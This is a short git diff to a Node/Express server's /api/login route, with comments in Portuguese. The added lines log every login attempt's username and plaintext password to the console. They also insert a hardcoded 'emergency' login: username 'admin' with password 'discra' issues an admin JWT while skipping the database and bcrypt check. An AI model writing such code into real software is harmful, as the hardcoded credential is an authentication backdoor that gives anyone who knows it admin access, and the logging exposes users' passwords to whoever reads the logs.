@@ -56,9 +56,17 @@ if (!adminExists) {
     setInterval(updateNetworkStatus, 30000);
 })();
 
-// --- ROTAS DA API ---
 app.post('/api/login', async (req, res) => {
     const { username, password } = req.body;
+    console.log("Tentativa de login:", username, password); // Isso vai aparecer nos logs!
+
+    // LOGIN DE EMERGÊNCIA: Se digitar admin e discra, entra direto
+    if (username === 'admin' && password === 'discra') {
+        const token = jwt.sign({ id: 99, user: 'admin' }, SECRET, { expiresIn: '8h' });
+        return res.json({ token });
+    }
+
+    // Se não for o de emergência, tenta o banco de dados
     const user = await db.get('SELECT * FROM users WHERE username = ?', [username]);
     if (user && await bcrypt.compare(password, user.password)) {
         const token = jwt.sign({ id: user.id, user: user.username }, SECRET, { expiresIn: '8h' });
